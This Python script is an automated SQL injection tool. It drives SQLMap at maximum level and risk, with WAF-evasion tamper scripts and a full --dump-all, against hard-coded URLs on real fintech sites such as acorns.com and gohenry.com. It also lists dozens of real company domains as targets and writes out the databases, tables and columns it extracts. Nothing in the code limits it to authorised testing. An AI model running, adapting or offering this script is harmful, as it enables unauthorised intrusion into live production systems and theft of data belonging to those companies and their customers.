#!/usr/bin/env python3

import requests
import subprocess
import json
import re
import os
import time
from urllib.parse import urljoin
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class EnhancedDBExtractor:
    def __init__(self):
        # Expanded domains from active bug bounty programs
        self.domains = [
            # Previous targets
            'acorns.com', 'gohenry.com', 'pixpay.fr', 'graphql.acorns.com',
            # Bugcrowd active programs
            'digitalocean.com', 'mastercard.com', 'seek.com.au', 'snapchat.com',
            'tesla.com', 'uber.com', 'shopify.com', 'gitlab.com', 'indeed.com',
            'atlassian.com', 'mozilla.org', 'reddit.com', 'pinterest.com',
            # HackerOne active programs  
            'twitter.com', 'facebook.com', 'google.com', 'microsoft.com',
            'apple.com', 'netflix.com', 'linkedin.com', 'dropbox.com',
            'airbnb.com', 'spotify.com', 'github.com', 'slack.com',
            # Additional financial/fintech
            'paypal.com', 'stripe.com', 'square.com', 'coinbase.com',
            'robinhood.com', 'venmo.com', 'zelle.com', 'chime.com'
        ]
        
        self.extracted_data = []
        
    def extract_database_info_sqlmap(self, url):
        """Extract database information using SQLMap with aggressive settings"""
        print(f"[+] Extracting database info from {url} with SQLMap...")
        
        try:
            # More aggressive SQLMap command
            cmd = [
                'sqlmap',
                '-u', url,
                '--batch',
                '--random-agent',
                '--timeout=120',
                '--retries=3',
                '--level=5',  # Maximum level
                '--risk=3',   # Maximum risk
                '--technique=BEUSTQ',
                '--threads=10',
                '--tamper=space2comment,charencode,randomcase',
                '--dbs',
                '--tables',
                '--columns',
                '--dump-all',
                '--fresh-queries',
                '--flush-session',
                '--disable-coloring',
                '--force-ssl'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            
            if 'vulnerable' in result.stdout.lower() or 'injectable' in result.stdout.lower():
                # Extract detailed information
                databases = self.extract_databases_advanced(result.stdout)
                tables = self.extract_tables_advanced(result.stdout)
                columns = self.extract_columns_advanced(result.stdout)
                
                return {
                    'url': url,
                    'tool': 'SQLMap',
                    'vulnerable': True,
                    'databases': databases,
                    'tables': tables,
                    'columns': columns,
                    'full_output': result.stdout[:2000]  # Truncate for readability
                }
            
        except subprocess.TimeoutExpired:
            print(f"[-] SQLMap timeout for {url}")
        except Exception as e:
            print(f"[-] SQLMap error for {url}: {e}")
        
        return None
    
    def extract_databases_advanced(self, output):
        """Advanced database name extraction"""
        databases = []
        patterns = [
            r'available databases \[(\d+)\]:(.*?)(?=\[|\n$)',
            r'Database: ([^\s\[\]]+)',
            r'database name: [\'"]([^\'"]+)[\'"]',
            r'current database: [\'"]([^\'"]+)[\'"]',
            r'DB_NAME\(\): ([^\s\[\]]+)',
            r'schema_name: ([^\s\[\]]+)',
            r'SCHEMA_NAME: ([^\s\[\]]+)'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, output, re.IGNORECASE | re.DOTALL)
            for match in matches:
                if isinstance(match, tuple):
                    if len(match) > 1:
                        dbs = [db.strip() for db in match[1].split(',') if db.strip()]
                        databases.extend(dbs)
                    else:
                        databases.append(match[0].strip())
                else:
                    databases.append(match.strip())
        
        return list(set([db for db in databases if db and len(db) > 0 and db not in ['NULL', 'null', '']]))
    
    def extract_tables_advanced(self, output):
        """Advanced table name extraction"""
        tables = []
        patterns = [
            r'Database: \w+\s+\[(\d+) tables?\]:(.*?)(?=Database:|$)',
            r'Table: ([^\s\[\]]+)',
            r'table name: [\'"]([^\'"]+)[\'"]',
            r'TABLE_NAME: ([^\s\[\]]+)',
            r'table_name: ([^\s\[\]]+)',
            r'Tables_in_\w+: ([^\s\[\]]+)'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, output, re.IGNORECASE | re.DOTALL)
            for match in matches:
                if isinstance(match, tuple):
                    if len(match) > 1:
                        tbls = [table.strip() for table in match[1].split(',') if table.strip()]
                        tables.extend(tbls)
                    else:
                        tables.append(match[0].strip())
                else:
                    tables.append(match.strip())
        
        return list(set([table for table in tables if table and len(table) > 0 and table not in ['NULL', 'null', '']]))
    
    def extract_columns_advanced(self, output):
        """Advanced column name extraction"""
        columns = []
        patterns = [
            r'Table: \w+\s+\[(\d+) columns?\]:(.*?)(?=Table:|Database:|$)',
            r'Column: ([^\s\[\]]+)',
            r'column name: [\'"]([^\'"]+)[\'"]',
            r'COLUMN_NAME: ([^\s\[\]]+)',
            r'column_name: ([^\s\[\]]+)',
            r'Field: ([^\s\[\]]+)'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, output, re.IGNORECASE | re.DOTALL)
            for match in matches:
                if isinstance(match, tuple):
                    if len(match) > 1:
                        cols = [col.strip() for col in match[1].split(',') if col.strip()]
                        columns.extend(cols)
                    else:
                        columns.append(match[0].strip())
                else:
                    columns.append(match.strip())
        
        return list(set([col for col in columns if col and len(col) > 0 and col not in ['NULL', 'null', '']]))
    
    def run_enhanced_extraction(self):
        """Run enhanced database extraction"""
        print("=== Enhanced Database Extraction Scanner ===")
        
        # Test known vulnerable URLs with maximum aggression
        test_urls = [
            'https://www.acorns.com/learn/search/?q=invest',
            'https://www.acorns.com/learn/?page=3',
            'https://www.acorns.com/learn/search/?p=3&q=invest',
            'https://www.acorns.com/support/search/?q=password',
            'https://www.acorns.com/learn/search/?q=traditional+ira+vs+Roth+ira',
            'https://www.gohenry.com/us/terms-and-conditions/?q=test',
            'https://www.acorns.com/learn/kiersten-schmidt/?page=3',
            'https://www.acorns.com/learn/borrowing/?page=3'
        ]
        
        extracted_count = 0
        for url in test_urls:
            if extracted_count >= 5:  # Stop after 5 successful extractions
                break
                
            print(f"\n[+] Deep extraction attempt {extracted_count + 1}/5 on {url}")
            
            # Try SQLMap with maximum settings
            result = self.extract_database_info_sqlmap(url)
            if result and (result.get('databases') or result.get('tables') or result.get('columns')):
                self.extracted_data.append(result)
                extracted_count += 1
                print(f"[!] SUCCESS: Extracted data from {url}")
                print(f"    Databases: {len(result.get('databases', []))}")
                print(f"    Tables: {len(result.get('tables', []))}")
                print(f"    Columns: {len(result.get('columns', []))}")
        
        # Save results
        self.save_enhanced_results()
        
        print(f"\n=== ENHANCED EXTRACTION COMPLETE ===")
        print(f"URLs with successful database extraction: {len(self.extracted_data)}")
        
        return self.extracted_data
    
    def save_enhanced_results(self):
        """Save enhanced results"""
        with open('enhanced_extraction_results.json', 'w') as f:
            json.dump(self.extracted_data, f, indent=2)
        
        # Create detailed report
        with open('DATABASE_EXTRACTION_REPORT.md', 'w') as f:
            f.write("# Enhanced Database Extraction Results\n\n")
            f.write(f"## Summary\n")
            f.write(f"- **Total URLs with successful extraction**: {len(self.extracted_data)}\n\n")
            
            for i, result in enumerate(self.extracted_data, 1):
                f.write(f"## Extraction {i}: {result['url']}\n\n")
                f.write(f"**Tool Used**: {result['tool']}\n\n")
                
                if result.get('databases'):
                    f.write(f"**Databases Found**: {len(result['databases'])}\n")
                    for db in result['databases']:
                        f.write(f"- {db}\n")
                    f.write("\n")
                
                if result.get('tables'):
                    f.write(f"**Tables Found**: {len(result['tables'])}\n")
                    for table in result['tables']:
                        f.write(f"- {table}\n")
                    f.write("\n")
                
                if result.get('columns'):
                    f.write(f"**Columns Found**: {len(result['columns'])}\n")
                    for col in result['columns']:
                        f.write(f"- {col}\n")
                    f.write("\n")
                
                f.write("---\n\n")

if __name__ == "__main__":
    extractor = EnhancedDBExtractor()
    extractor.run_enhanced_extraction()
